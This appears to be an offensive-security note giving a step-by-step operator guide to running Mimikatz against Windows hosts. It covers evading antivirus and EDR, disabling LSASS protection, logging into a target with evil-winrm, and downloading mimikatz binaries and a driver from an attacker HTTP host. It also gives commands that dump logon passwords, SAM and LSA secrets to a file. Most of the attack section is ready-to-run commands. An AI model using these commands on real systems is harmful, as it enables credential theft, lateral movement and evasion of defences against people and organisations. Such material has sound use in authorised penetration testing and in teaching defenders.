# Mimikatz Usage and Execution

Part of the **Offensive-Active-Directory / Post-Exploitation / mimikatz** notes series.

Mimikatz is a widely used post-exploitation tool for extracting credentials
from Windows systems. Below is a structured guide on how to execute Mimikatz
and its alternatives, along with various commands used for credential
extraction.

---

## Getting Started with Mimikatz

### 1. Download and Extract Mimikatz

You can download the Mimikatz tool from the following links:

- [Mimikatz GitHub Repository](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz GitHub Releases](https://github.com/gentilkiwi/mimikatz/releases)

To use Mimikatz, follow these commands:

```bash
unzip mimikatz_trunk.zip -d mimikatz
mv -v mimikatz /opt/share/mimikatz
cd /opt/share/mimikatz
```

> **Note:** Browsers/GitHub may flag `mimikatz_trunk.zip` as a "dangerous"
> download since Mimikatz is a dual-use security tool — this is expected.

### 2. Run Mimikatz

To start Mimikatz:

```
mimikatz
```

To view available options:

```
mimikatz --help
```

---

## Local Login Commands

### Local Login Commands Pre-Requisites

Before executing Mimikatz for local login commands, ensure the following
prerequisites are met:

**1. Administrator Privileges**
- Mimikatz requires elevated permissions (Administrator or SYSTEM user) to interact with the system's memory and extract credentials.
- Without these privileges, Mimikatz cannot access sensitive system areas like LSASS (Local Security Authority Subsystem Service), which stores passwords and tokens.

**2. Debug Privileges**
- Debug privileges are required to access LSASS memory and extract login credentials.
- Grant debug privileges with the command:

```
mimikatz # privilege::debug
```

- Without debug privileges, Mimikatz cannot perform memory reading or credential extraction actions.

**3. Disable Anti-Virus/EDR Software (Optional)**
- Anti-virus or Endpoint Detection & Response (EDR) software (e.g., Windows Defender, CrowdStrike, SentinelOne) may detect and block Mimikatz.
- To bypass detection:
  - Disable or bypass Anti-Virus/EDR tools temporarily (if authorized).
  - Use obfuscated or custom-built versions of Mimikatz.

**4. Ensure LSASS Protection is Disabled**
- Modern Windows versions have protections to prevent unauthorized access to LSASS memory:
  - **Credential Guard**: Prevents Mimikatz from interacting with LSASS.
  - **LSASS Protection**: Prevents reading of LSASS memory by non-privileged processes (Windows 10 v1809+).
- Ensure these protections are disabled for Mimikatz to run successfully.

**5. System Architecture Compatibility**
- Mimikatz is available in both 32-bit and 64-bit versions. Use the version that matches your system architecture:
  - **32-bit systems**: Use the 32-bit version of Mimikatz.
  - **64-bit systems**: Use the 64-bit version of Mimikatz.
- Check the system architecture with the command:

```powershell
systeminfo | findstr /C:"System Type"
```

**6. Run from a Trusted Location**
- To avoid detection as malicious, run Mimikatz from trusted directories like:
  - `C:\Windows\System32`
  - `C:\Users\<user>\Documents`
- Running from less restricted locations can help Mimikatz avoid being flagged by security solutions.

**7. Access to the LSASS Process**
- Mimikatz requires access to the LSASS process to extract login credentials.
- For remote execution, ensure you have administrative access to the target machine to interact with its LSASS process.
- Commands like `sekurlsa::logonpasswords` depend on accessing LSASS memory.

**8. Network Configuration (for Remote Execution)**
- If running Mimikatz remotely, ensure network access to the target machine:
  - Ensure you can remotely execute programs using tools like `psexec` or `WinRM`.
  - Verify firewall rules allow remote execution commands to reach the target machine.

**9. System Reboot (if required)**
- Some settings, such as debug privileges, may require a system reboot for changes to take effect.
- Ensure you have a plan in place for restarting the system if needed.

**10. Testing in a Controlled Environment**
- Before running Mimikatz in a production environment, test it in a lab environment to verify functionality and prevent potential issues (e.g., system instability).

---

## Credential Extraction on the Local Machine

Remote access to the target (example using evil-winrm):

```bash
evil-winrm -u jdoe -p Password123! -i 192.168.1.61
```

Transferring Mimikatz binaries/DLLs to the target over HTTP (PowerShell):

```powershell
Invoke-WebRequest http://192.168.10.7/mimidrv.sys -OutFile mimidrv.sys
iwr http://192.168.10.7/mimidrv.sys -OutFile mimidrv.sys
iwr http://192.168.10.7/mimikatz.exe -OutFile mimikatz.exe
iwr http://192.168.10.7/mimilib.dll -OutFile mimilib.dll
iwr http://192.168.10.7/mimispool.dll -OutFile mimispool.dll
```

**1. Start Mimikatz** from a specific location:

```
mimikatz.exe
```

**2. Grant Debug Privileges** to interact with system memory:

```
mimikatz # privilege::debug
```

**3. Dump Logon Passwords** from LSASS (Local Security Authority Subsystem Service):

```
mimikatz # sekurlsa::logonpasswords
```

**4. Dump SAM (Security Account Manager) Data:**

```
mimikatz # lsadump::sam
```

**5. Patch LSA (Local Security Authority) Memory:**

```
mimikatz # lsadump::lsa /patch
```

**6. Execute a Combined Command to Extract Passwords and Save to a File:**

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

To save output to a file:

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit >> hash.txt
```

---

## Using LSASS Memory Dumps (lsass.dmp)

If you cannot run Mimikatz directly due to security restrictions, you can
dump LSASS memory and analyze it offline.

> See the companion note **LSASS-Dumping-Credential-Extraction-using-pypykatz.md**
> for the full offline dump/exfiltration/extraction workflow (comsvcs.dll
> MiniDump technique, SMB/HTTP/SCP exfiltration methods, and parsing with
> `pypykatz`).
